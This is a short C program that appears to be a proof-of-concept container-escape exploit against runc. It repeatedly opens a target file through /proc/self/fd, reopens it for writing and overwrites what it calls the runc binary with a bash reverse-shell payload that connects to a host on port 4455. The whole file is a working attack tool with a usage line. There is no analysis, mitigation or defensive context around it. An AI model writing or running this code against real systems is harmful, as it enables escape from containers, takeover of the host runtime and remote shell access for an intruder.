#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define O_PATH 010000000
#define SELF_FD_FMT "/proc/self/fd/%d"
#define PAYLOAD "#!/bin/bash\n/bin/bash -i >& /dev/tcp/127.0.0.1/4455 0>&1"
#define TIMES 99999

int main(int argc, char **argv) {
    int fd, ret;
    char dest[512];

    if (argc < 2) {
        printf("usage: %s FILE\n", argv[0]);
        return 1;
    }

    int i;
    for (i = 0; i < TIMES; i++) {
        fd = open(argv[1], O_PATH);
        if (fd >= 0) {
            printf("Successfuly opened %s at fd %d\n", argv[1], fd);
            snprintf(dest, 500, SELF_FD_FMT, fd);
            puts(dest);
            for (i = 0; i < TIMES; i++) {
                fd = open(dest, O_WRONLY | O_TRUNC);
                if (fd >= 0) {
                    printf("Successfully openned runc binary as WRONLY\n");
                    ret = write(fd, PAYLOAD, strlen(PAYLOAD));
                    if (ret > 0) printf("Payload deployed\n");
                    return 0;
                }
            }
            return -1;
        }
    }
    if (i > TIMES) {
        return -1;
    }
    return 0;
}
